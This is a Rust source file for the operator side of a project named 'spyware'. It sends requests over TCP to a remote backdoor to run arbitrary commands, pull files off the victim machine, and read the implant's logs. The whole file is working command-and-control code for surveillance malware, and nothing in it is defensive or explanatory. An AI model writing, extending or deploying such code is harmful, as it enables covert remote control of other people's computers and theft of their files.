use serde::Serialize;
use spyware::communication::messages::{
    DownloadFileResponse, ErrorInfo, GetLogsRequest, GetLogsResponse, Message, RunCommandRequest,
    RunCommandResponse,
};
use std::io::{Error, Write};
use std::net::TcpStream;

use spyware::communication::messages::DownloadFileRequest;
use spyware::communication::serialization::serialize_message;
use spyware::communication::server::get_message;

pub fn send_request(req: Message, stream: &mut TcpStream) -> Result<(), Error> {
    let msg = serialize_message(req).unwrap();

    println!("Sending buffer {:?}", msg);
    stream
        .write_all(&msg)
        .expect("Could not write data to stream");
    println!("Sent message, awaiting reply...");
    Ok(())
}

pub fn run_command(
    command: String,
    stream: &mut TcpStream,
) -> Result<RunCommandResponse, ErrorInfo> {
    println!("Running command {} through backdoor.", command);
    let req = RunCommandRequest {
        command,
        async_run: false,
    };
    send_request(Message::RunCommandRequest { 0: req }, stream).expect("Could not send request");

    let message = get_message(&stream).expect("Could not get message from stream");
    match message {
        Message::RunCommandResponse(rcr) => {
            if rcr.error_info.is_none() {
                println!("Output: {} ", &rcr.output);
                println!("Error info: {:?}", rcr.error_info);
                Ok(rcr)
            } else {
                Err(rcr.error_info.unwrap())
            }
        }
        _ => {
            panic!("Got unexpected response type");
        }
    }
}

pub fn download_file(remote_path: String, local_path: String, stream: &mut TcpStream) {
    let req = DownloadFileRequest { path: remote_path };
    send_request(Message::DownloadFileRequest { 0: req }, stream).expect("Could not send request");

    let response = get_message(&stream).expect("Could not get message from stream");
    match response {
        Message::DownloadFileResponse(download_file_response) => {
            println!(
                "Received response! Error info: {:?}",
                download_file_response.error_info
            );
            println!(
                "File received size: {} bytes",
                &download_file_response.file_data.len()
            );
            match std::fs::File::create(&local_path) {
                Ok(mut file) => {
                    println!("Writing data to file {}", &local_path);
                    file.write(&download_file_response.file_data).unwrap();
                }
                Err(err) => {
                    panic!(format!("Could not create file {}", &local_path))
                }
            }
        }
        _ => {
            panic!("Bad response id")
        }
    }
}

pub fn get_spyware_logs(stream: &mut TcpStream) {
    let req = GetLogsRequest {};
    send_request(Message::GetLogsRequest { 0: req }, stream)
        .expect("Could not send get logs request");

    let response = get_message(&stream).expect("Could not get message from stream");
    match response {
        Message::GetLogsResponse(get_logs_resp) => {
            println!(
                "Received response! Error info: {:?}",
                get_logs_resp.error_info
            );
            println!("Received response! The remote logs:");
            for log in &get_logs_resp.logs {
                println!("{}", log);
            }
        }
        _ => {
            panic!("Got unexpected response type")
        }
    }
}
